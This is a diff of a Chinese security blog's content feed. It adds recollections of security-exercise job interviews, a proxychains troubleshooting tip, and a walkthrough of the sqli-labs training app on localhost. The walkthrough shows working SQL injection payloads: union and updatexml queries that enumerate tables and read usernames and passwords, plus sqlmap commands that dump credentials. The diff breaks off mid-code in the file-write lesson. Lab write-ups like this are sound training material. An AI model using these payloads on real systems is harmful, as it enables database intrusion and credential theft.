-    <content><![CDATA[<h1 id="一面"><a href="#一面" class="headerlink" title="一面:"></a>一面:</h1><h3 id="如何接触网络安全的"><a href="#如何接触网络安全的" class="headerlink" title="如何接触网络安全的"></a>如何接触网络安全的</h3><p>答：在大一时开始接触CTF，那时候开始正式接触安全，然后后面主要是学习的web安全，经常会看先知社区，freebuf，csdn和乌云<span id="more"></span>之类的社区文章学习</p>
-<h3 id="有无接触过安全设备"><a href="#有无接触过安全设备" class="headerlink" title="有无接触过安全设备"></a>有无接触过安全设备</h3><p>答：没接触过。</p>
-<h3 id="是否熟悉windows或者linux命令的使用"><a href="#是否熟悉windows或者linux命令的使用" class="headerlink" title="是否熟悉windows或者linux命令的使用"></a>是否熟悉windows或者linux命令的使用</h3><p>答：之前有学习过Linux，对于Linux和Windows的基本命令操作<!--more-->都可以熟悉使用。&lt; !–more–&gt;</p>
-<h3 id="说一下如何进行信息收集"><a href="#说一下如何进行信息收集" class="headerlink" title="说一下如何进行信息收集"></a>说一下如何进行信息收集</h3><p>答：略</p>
-<h3 id="sql注入写shell的条件"><a href="#sql注入写shell的条件" class="headerlink" title="sql注入写shell的条件"></a>sql注入写shell的条件</h3><p>答：<br>1.拥有root权限<br>2.知道网站绝对路径<br>3.开启PHP的全局gpc<br>4 在写入的目录下有写入权限</p>
-<h3 id="xss的防御"><a href="#xss的防御" class="headerlink" title="xss的防御"></a>xss的防御</h3><p>答：1.进行实体编码<br>       2.对特殊字符进行过滤</p>
-<h3 id="说一下ssrf的原理及利用"><a href="#说一下ssrf的原理及利用" class="headerlink" title="说一下ssrf的原理及利用"></a>说一下ssrf的原理及利用</h3><p>答：ssrf是一个攻击者构造形成从服务器端发起的安全漏洞，一般在服务器获取图片，文本之类的地方看到有引用其他文件的地方可以尝试一下是否有ssrf存在<br>利用：<br>1.可以用来对内网端口扫描<br>2.进行文件读取</p>
-<h3 id="有没有接触过shiro漏洞"><a href="#有没有接触过shiro漏洞" class="headerlink" title="有没有接触过shiro漏洞"></a>有没有接触过shiro漏洞</h3><p>答：记着以前复现过shiro的反序列化，主要是在rememberme处，其解析为rememberme的cookie值– base64–aes解密–反序列化</p>
-<h3 id="有没有溯源的经历"><a href="#有没有溯源的经历" class="headerlink" title="有没有溯源的经历"></a>有没有溯源的经历</h3><p>答：之前学校图书馆有过一次被入侵的经历，当时去看了一下，由于第一次接触就学了下相关内容</p>
-<h3 id="说一下应急响应的基本流程"><a href="#说一下应急响应的基本流程" class="headerlink" title="说一下应急响应的基本流程"></a>说一下应急响应的基本流程</h3><p>答：对于Windows端的后门排除</p>
-<h4 id="可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等"><a href="#可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等" class="headerlink" title="可以使用一些安全工具：d盾，logparser，autoruns，process explorer等"></a>可以使用一些安全工具：d盾，logparser，autoruns，process explorer等</h4><h4 id="项目检查"><a href="#项目检查" class="headerlink" title="项目检查"></a>项目检查</h4><p>注册表启动项<br>网络连接<br>恶意进程<br>系统服务<br>计划任务</p>
-<h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>可以使用logparser格式化后进行分析<br>也可以使用Windows的事件查看器进行分析</p>
-<h4 id="检查是否存在shift粘滞键后门"><a href="#检查是否存在shift粘滞键后门" class="headerlink" title="检查是否存在shift粘滞键后门"></a>检查是否存在shift粘滞键后门</h4><p>对于Linux端<br>1.查看异常账号        cat /etc/passwd<br>2.查看进程              ps -ef 丨more<br>3.查看网络连接       netstat -anplt<br>4.计划任务<br>5.系统启动项<br>6.系统日志</p>
-<h4 id="对于web服务器"><a href="#对于web服务器" class="headerlink" title="对于web服务器"></a>对于web服务器</h4><p>可以查看中间件配置和相关日志<br>当然也要考虑浏览器劫持问题<br>f12查看网络的加载</p>
-<h3 id="有没有面试过其他公司的hw"><a href="#有没有面试过其他公司的hw" class="headerlink" title="有没有面试过其他公司的hw"></a>有没有面试过其他公司的hw</h3><p>答：没有</p>
-<h3 id="期望的薪资是多少"><a href="#期望的薪资是多少" class="headerlink" title="期望的薪资是多少"></a>期望的薪资是多少</h3><p><em>面试难度：易<br>面试结果：通过</em></p>
-<h1 id="二面"><a href="#二面" class="headerlink" title="二面:"></a>二面:</h1><h3 id="你好，我们是xxx，请问你是xxx吗，现在方便吗？"><a href="#你好，我们是xxx，请问你是xxx吗，现在方便吗？" class="headerlink" title="你好，我们是xxx，请问你是xxx吗，现在方便吗？"></a>你好，我们是xxx，请问你是xxx吗，现在方便吗？</h3><p>答：您好，是的，现在方便，您讲。</p>
-<h3 id="你先说一下什么是护网，护网的背景"><a href="#你先说一下什么是护网，护网的背景" class="headerlink" title="你先说一下什么是护网，护网的背景"></a>你先说一下什么是护网，护网的背景</h3><p>答：略</p>
-<h3 id="说一下hw防守方流程"><a href="#说一下hw防守方流程" class="headerlink" title="说一下hw防守方流程"></a>说一下hw防守方流程</h3><p>答：前期需要对资产进行梳理，排查暴露面和敏感信息，中期要7*24h值守，及时写日报和周报，后期就需要总结和整改</p>
-<h3 id="你说一下struct2-特征"><a href="#你说一下struct2-特征" class="headerlink" title="你说一下struct2 特征"></a>你说一下struct2 特征</h3><p>答：没怎么了解过，只知道有rce漏洞（.action .do）</p>
-<h3 id="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"><a href="#看你简历上有过图书馆溯源经历，你简单说一下溯源经历" class="headerlink" title="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"></a>看你简历上有过图书馆溯源经历，你简单说一下溯源经历</h3><p>答：去年我们学校图书馆又被入侵过，老师让我们过去看一下，因为当时是第一次接触，就学习一下</p>
-<h3 id="使用事件查看器查看一下是否存在异常事件"><a href="#使用事件查看器查看一下是否存在异常事件" class="headerlink" title="使用事件查看器查看一下是否存在异常事件"></a>使用事件查看器查看一下是否存在异常事件</h3><h3 id="那你说一下异常事件有哪些？"><a href="#那你说一下异常事件有哪些？" class="headerlink" title="那你说一下异常事件有哪些？"></a>那你说一下异常事件有哪些？</h3><p>答：这个不是很了解</p>
-<h3 id="那你继续说"><a href="#那你继续说" class="headerlink" title="那你继续说"></a>那你继续说</h3><p>答：可以查看一下开放的端口，并关闭一些不必要的</p>
-<h3 id="那你用什么查看呢"><a href="#那你用什么查看呢" class="headerlink" title="那你用什么查看呢"></a>那你用什么查看呢</h3><p>答：netstat -anlpt</p>
-<h3 id="那你都关闭了那些端口呢"><a href="#那你都关闭了那些端口呢" class="headerlink" title="那你都关闭了那些端口呢"></a>那你都关闭了那些端口呢</h3><p>答：这个好像不太记得了，好像关闭了3389之类的，还关闭了一个数据库的应该是，记不清楚了，因为这个图书馆管理系统是老师自己用phpstudy搭建的。当时还查看了一下系统账号发现有几个被人添加过的账号，也存在隐藏用户</p>
-<h3 id="那你说一下是怎么发现隐藏账户的呢"><a href="#那你说一下是怎么发现隐藏账户的呢" class="headerlink" title="那你说一下是怎么发现隐藏账户的呢"></a>那你说一下是怎么发现隐藏账户的呢</h3><p>答：我记着在注册表的“sam”（当时记不起来具体叫什么了）然后去找是否存在隐藏账号</p>
-<h3 id="那隐藏账户有什么特征呢？"><a href="#那隐藏账户有什么特征呢？" class="headerlink" title="那隐藏账户有什么特征呢？"></a>那隐藏账户有什么特征呢？</h3><p>答：隐藏账户都会有~（当时忘记了是$，然后hr也有点疑问，但就是没想起来，隐藏用户用$符，当时回答时错说成了~隐藏用户<br>查看注册表 sam下 domains account users查看users表项中与names表项中项数量是否一致如果一致就没有隐藏用户如果不一致，就对照其他电脑用户注册表，即可找出其他隐藏用户事件查看器，查看异常事件）</p>
-<h3 id="那你是怎么去查看日志的呢？"><a href="#那你是怎么去查看日志的呢？" class="headerlink" title="那你是怎么去查看日志的呢？"></a>那你是怎么去查看日志的呢？</h3><p>答：那个系统是好像一个window2008，使用的是Apache，一般Apache的日志好像是httpd</p>
-<h3 id="是httpd吗？"><a href="#是httpd吗？" class="headerlink" title="是httpd吗？"></a>是httpd吗？</h3><p>答：这个我有些忘记了，不好意思（当时没想出来，logs/access.log和log/error.log）</p>
-<h3 id="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"><a href="#hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。" class="headerlink" title="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"></a>hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。</h3><p>答：好的，麻烦您了，再见~</p>
-<p><em>面试来的挺突然的，当时刚要去出去吃晚饭，总共聊了10分钟，感觉回答的不是很好，最后凉了😭</em></p>
-]]></content>
-      <categories>
-        <category>面试</category>
-      </categories>
-      <tags>
-        <tag>面试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>信息收集</title>
     <url>/posts/312e3d12/</url>
     <content><![CDATA[<h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><h3 id="web接口查询"><a href="#web接口查询" class="headerlink" title="web接口查询:"></a>web接口查询:</h3><p><code>https://whois.aliyun.com/</code><br><code>https://www.whois365.com/cn/</code><br><code>http://whois.chinaz.com/</code><br><code>https://whois.aizhan.com/</code></p>
@@ -710,6 +530,18 @@
       </tags>
   </entry>
   <entry>
+    <title>使用proxychains4gitclone拒绝访问</title>
+    <url>/posts/3a6e39d4/</url>
+    <content><![CDATA[<p>问题:Ubuntu使用proxychain4 git clone 报错 192.168.3.11 1080 拒绝访问<br>原因: 端口被占用了，之前在虚拟机Ubuntu的代理地方设置了代理，再用使用proxychain4，把在虚拟机中的代理设置取消掉就可以了</p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>记一次hw面试经历(2)</title>
     <url>/posts/e9000575/</url>
     <content><![CDATA[<h3 id="现在是不是上大学，4月份是否有时间，"><a href="#现在是不是上大学，4月份是否有时间，" class="headerlink" title="现在是不是上大学，4月份是否有时间，"></a>现在是不是上大学，4月份是否有时间，</h3><p>答: 现在大三在读，4月份有时间可以出来</p>
@@ -725,6 +557,302 @@
       </categories>
       <tags>
         <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次hw面试经历(1)</title>
+    <url>/posts/40769f33/</url>
+    <content><![CDATA[<h1 id="一面"><a href="#一面" class="headerlink" title="一面:"></a>一面:</h1><h3 id="如何接触网络安全的"><a href="#如何接触网络安全的" class="headerlink" title="如何接触网络安全的"></a>如何接触网络安全的</h3><p>答：在大一时开始接触CTF，那时候开始正式接触安全，然后后面主要是学习的web安全，经常会看先知社区，freebuf，csdn和乌云<span id="more"></span>之类的社区文章学习</p>
+<h3 id="有无接触过安全设备"><a href="#有无接触过安全设备" class="headerlink" title="有无接触过安全设备"></a>有无接触过安全设备</h3><p>答：没接触过。</p>
+<h3 id="是否熟悉windows或者linux命令的使用"><a href="#是否熟悉windows或者linux命令的使用" class="headerlink" title="是否熟悉windows或者linux命令的使用"></a>是否熟悉windows或者linux命令的使用</h3><p>答：之前有学习过Linux，对于Linux和Windows的基本命令操作<!--more-->都可以熟悉使用。&lt; !–more–&gt;</p>
+<h3 id="说一下如何进行信息收集"><a href="#说一下如何进行信息收集" class="headerlink" title="说一下如何进行信息收集"></a>说一下如何进行信息收集</h3><p>答：略</p>
+<h3 id="sql注入写shell的条件"><a href="#sql注入写shell的条件" class="headerlink" title="sql注入写shell的条件"></a>sql注入写shell的条件</h3><p>答：<br>1.拥有root权限<br>2.知道网站绝对路径<br>3.开启PHP的全局gpc<br>4 在写入的目录下有写入权限</p>
+<h3 id="xss的防御"><a href="#xss的防御" class="headerlink" title="xss的防御"></a>xss的防御</h3><p>答：1.进行实体编码<br>       2.对特殊字符进行过滤</p>
+<h3 id="说一下ssrf的原理及利用"><a href="#说一下ssrf的原理及利用" class="headerlink" title="说一下ssrf的原理及利用"></a>说一下ssrf的原理及利用</h3><p>答：ssrf是一个攻击者构造形成从服务器端发起的安全漏洞，一般在服务器获取图片，文本之类的地方看到有引用其他文件的地方可以尝试一下是否有ssrf存在<br>利用：<br>1.可以用来对内网端口扫描<br>2.进行文件读取</p>
+<h3 id="有没有接触过shiro漏洞"><a href="#有没有接触过shiro漏洞" class="headerlink" title="有没有接触过shiro漏洞"></a>有没有接触过shiro漏洞</h3><p>答：记着以前复现过shiro的反序列化，主要是在rememberme处，其解析为rememberme的cookie值– base64–aes解密–反序列化</p>
+<h3 id="有没有溯源的经历"><a href="#有没有溯源的经历" class="headerlink" title="有没有溯源的经历"></a>有没有溯源的经历</h3><p>答：之前学校图书馆有过一次被入侵的经历，当时去看了一下，由于第一次接触就学了下相关内容</p>
+<h3 id="说一下应急响应的基本流程"><a href="#说一下应急响应的基本流程" class="headerlink" title="说一下应急响应的基本流程"></a>说一下应急响应的基本流程</h3><p>答：对于Windows端的后门排除</p>
+<h4 id="可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等"><a href="#可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等" class="headerlink" title="可以使用一些安全工具：d盾，logparser，autoruns，process explorer等"></a>可以使用一些安全工具：d盾，logparser，autoruns，process explorer等</h4><h4 id="项目检查"><a href="#项目检查" class="headerlink" title="项目检查"></a>项目检查</h4><p>注册表启动项<br>网络连接<br>恶意进程<br>系统服务<br>计划任务</p>
+<h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>可以使用logparser格式化后进行分析<br>也可以使用Windows的事件查看器进行分析</p>
+<h4 id="检查是否存在shift粘滞键后门"><a href="#检查是否存在shift粘滞键后门" class="headerlink" title="检查是否存在shift粘滞键后门"></a>检查是否存在shift粘滞键后门</h4><p>对于Linux端<br>1.查看异常账号        cat /etc/passwd<br>2.查看进程              ps -ef 丨more<br>3.查看网络连接       netstat -anplt<br>4.计划任务<br>5.系统启动项<br>6.系统日志</p>
+<h4 id="对于web服务器"><a href="#对于web服务器" class="headerlink" title="对于web服务器"></a>对于web服务器</h4><p>可以查看中间件配置和相关日志<br>当然也要考虑浏览器劫持问题<br>f12查看网络的加载</p>
+<h3 id="有没有面试过其他公司的hw"><a href="#有没有面试过其他公司的hw" class="headerlink" title="有没有面试过其他公司的hw"></a>有没有面试过其他公司的hw</h3><p>答：没有</p>
+<h3 id="期望的薪资是多少"><a href="#期望的薪资是多少" class="headerlink" title="期望的薪资是多少"></a>期望的薪资是多少</h3><p><em>面试难度：易<br>面试结果：通过</em></p>
+<h1 id="二面"><a href="#二面" class="headerlink" title="二面:"></a>二面:</h1><h3 id="你好，我们是xxx，请问你是xxx吗，现在方便吗？"><a href="#你好，我们是xxx，请问你是xxx吗，现在方便吗？" class="headerlink" title="你好，我们是xxx，请问你是xxx吗，现在方便吗？"></a>你好，我们是xxx，请问你是xxx吗，现在方便吗？</h3><p>答：您好，是的，现在方便，您讲。</p>
+<h3 id="你先说一下什么是护网，护网的背景"><a href="#你先说一下什么是护网，护网的背景" class="headerlink" title="你先说一下什么是护网，护网的背景"></a>你先说一下什么是护网，护网的背景</h3><p>答：略</p>
+<h3 id="说一下hw防守方流程"><a href="#说一下hw防守方流程" class="headerlink" title="说一下hw防守方流程"></a>说一下hw防守方流程</h3><p>答：前期需要对资产进行梳理，排查暴露面和敏感信息，中期要7*24h值守，及时写日报和周报，后期就需要总结和整改</p>
+<h3 id="你说一下struct2-特征"><a href="#你说一下struct2-特征" class="headerlink" title="你说一下struct2 特征"></a>你说一下struct2 特征</h3><p>答：没怎么了解过，只知道有rce漏洞（.action .do）</p>
+<h3 id="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"><a href="#看你简历上有过图书馆溯源经历，你简单说一下溯源经历" class="headerlink" title="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"></a>看你简历上有过图书馆溯源经历，你简单说一下溯源经历</h3><p>答：去年我们学校图书馆又被入侵过，老师让我们过去看一下，因为当时是第一次接触，就学习一下</p>
+<h3 id="使用事件查看器查看一下是否存在异常事件"><a href="#使用事件查看器查看一下是否存在异常事件" class="headerlink" title="使用事件查看器查看一下是否存在异常事件"></a>使用事件查看器查看一下是否存在异常事件</h3><h3 id="那你说一下异常事件有哪些？"><a href="#那你说一下异常事件有哪些？" class="headerlink" title="那你说一下异常事件有哪些？"></a>那你说一下异常事件有哪些？</h3><p>答：这个不是很了解</p>
+<h3 id="那你继续说"><a href="#那你继续说" class="headerlink" title="那你继续说"></a>那你继续说</h3><p>答：可以查看一下开放的端口，并关闭一些不必要的</p>
+<h3 id="那你用什么查看呢"><a href="#那你用什么查看呢" class="headerlink" title="那你用什么查看呢"></a>那你用什么查看呢</h3><p>答：netstat -anlpt</p>
+<h3 id="那你都关闭了那些端口呢"><a href="#那你都关闭了那些端口呢" class="headerlink" title="那你都关闭了那些端口呢"></a>那你都关闭了那些端口呢</h3><p>答：这个好像不太记得了，好像关闭了3389之类的，还关闭了一个数据库的应该是，记不清楚了，因为这个图书馆管理系统是老师自己用phpstudy搭建的。当时还查看了一下系统账号发现有几个被人添加过的账号，也存在隐藏用户</p>
+<h3 id="那你说一下是怎么发现隐藏账户的呢"><a href="#那你说一下是怎么发现隐藏账户的呢" class="headerlink" title="那你说一下是怎么发现隐藏账户的呢"></a>那你说一下是怎么发现隐藏账户的呢</h3><p>答：我记着在注册表的“sam”（当时记不起来具体叫什么了）然后去找是否存在隐藏账号</p>
+<h3 id="那隐藏账户有什么特征呢？"><a href="#那隐藏账户有什么特征呢？" class="headerlink" title="那隐藏账户有什么特征呢？"></a>那隐藏账户有什么特征呢？</h3><p>答：隐藏账户都会有~（当时忘记了是$，然后hr也有点疑问，但就是没想起来，隐藏用户用$符，当时回答时错说成了~隐藏用户<br>查看注册表 sam下 domains account users查看users表项中与names表项中项数量是否一致如果一致就没有隐藏用户如果不一致，就对照其他电脑用户注册表，即可找出其他隐藏用户事件查看器，查看异常事件）</p>
+<h3 id="那你是怎么去查看日志的呢？"><a href="#那你是怎么去查看日志的呢？" class="headerlink" title="那你是怎么去查看日志的呢？"></a>那你是怎么去查看日志的呢？</h3><p>答：那个系统是好像一个window2008，使用的是Apache，一般Apache的日志好像是httpd</p>
+<h3 id="是httpd吗？"><a href="#是httpd吗？" class="headerlink" title="是httpd吗？"></a>是httpd吗？</h3><p>答：这个我有些忘记了，不好意思（当时没想出来，logs/access.log和log/error.log）</p>
+<h3 id="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"><a href="#hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。" class="headerlink" title="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"></a>hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。</h3><p>答：好的，麻烦您了，再见~</p>
+<p><em>面试来的挺突然的，当时刚要去出去吃晚饭，总共聊了10分钟，感觉回答的不是很好，最后凉了😭</em></p>
+]]></content>
+      <categories>
+        <category>面试</category>
+      </categories>
+      <tags>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-lab1</title>
+    <url>/posts/2b9109b5/</url>
+    <content><![CDATA[<p><code>union select 1,2,table_name from information_schema.tables where table_schema = database() limit 0,1 </code>查字段</p>
+<p><code>union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39; limit 0,1</code></p>
+<h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>用<code>&#39;</code>闭合</p>
+<p><code>id = 1&#39; --+</code></p>
+<p><code>id =1&#39; order by 4 --+</code> #报错 说明有三个字段</p>
+<p><code>id = 1.9999&#39; and union select 1,2,3  --+ </code>  2,3是输出点</p>
+<p><code>id=1.9999&#39; and union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1 --+</code>查表名</p>
+<p><code>id=-1&#39; union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1--+</code> 查字段</p>
+<p><code>?id=-1&#39; union select 1,username,password from users limit 1,1--+</code> 查账号密码</p>
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --dbs --batch --tables</code></p>
+<p>加了<code>--batch</code> sqlmap不会询问你输入 全部默认确定</p>
+<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<p><code>id=1 and 1=1 union select 1,2, table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code> 查表名</p>
+<p><code>id=1 and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1--+</code> 查字段</p>
+<br/>
+
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-2/?id=1&quot; --dbs --batch --tables</code></p>
+<br/>
+
+<br/>
+
+<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>用<code>&#39;)</code>闭合</p>
+<p><code>id=1&#39;) and 1=1 --+</code></p>
+<p><code>id=1.999&#39;)  and 1=1 union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code></p>
+<p><code>id=1.999&#39;)  and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1 --+</code></p>
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-3/?id=1&quot; --dbs --batch</code></p>
+<br/>
+
+<h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>用<code>&quot;)</code>闭合</p>
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --dbs --batch</code></p>
+<br/>
+
+<h3 id="5-报错注入"><a href="#5-报错注入" class="headerlink" title="5.报错注入"></a>5.报错注入</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>id=1&#39; --+</code>页面正常 说明用 <code>&#39;</code>闭合</p>
+<p><code>id=1&#39;  and 1=1 --+</code> 有回显</p>
+<p><code>id=1&#39;  and 1=2 --+</code>无回显</p>
+<p>查看代码，发现只要语句执行成功就会返回’You are in ……..’</p>
+<p>可以考虑使用报错注入或者布尔盲注</p>
+<p>报错注入使用<code>updatexml</code></p>
+<p><code>id=1&#39;  and updatexml(1,concat(0x7e,(select concat_ws(&#39;:&#39;,database(),version(),user()))),1)--+</code>==&gt; <code>XPATH syntax error: &#39;~security:5.7.26:root@localhost&#39;</code>得到数据库等信息</p>
+<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; ),0x7e),1)--+</code>得到表名==&gt; <code>XPATH syntax error: &#39;~emails,referers,uagents,users~&#39;</code></p>
+<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1)--+</code>得到字段名==&gt;<code> XPATH syntax error: &#39;~id,username,password~&#39;</code></p>
+<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+</code>查账号密码</p>
+<br/>
+
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;</code>  #判断是否存在注入</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  --dbs</code>   #获取数据库信息</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security --tables</code> #获取表名</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users --columns</code>#获取字段名</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users -C username,password --dump</code> #获取账号密码</p>
+<br/>
+
+<br/>
+
+<h3 id="6-报错注入"><a href="#6-报错注入" class="headerlink" title="6.报错注入"></a>6.报错注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用<code>&quot;</code>闭合</p>
+<p>显错注入</p>
+<p><code>id=1&quot; --+</code></p>
+<p><code>id=1&quot; and 1=1 --+</code></p>
+<p><code>id=1&quot; and 1=2 --+</code></p>
+<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select database()),0x7e)),1) --+</code> 查数据库名 ==&gt;<code>XPATH syntax error: &#39;~security~&#39;</code></p>
+<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)),1) --+</code> 查表名</p>
+<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_schema=database()  and table_name=&#39;users&#39; limit 0,1),0x7e)),1) --+</code> 查字段</p>
+<br/>
+
+<h3 id="7-文件写入"><a href="#7-文件写入" class="headerlink" title="7.文件写入"></a>7.文件写入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= 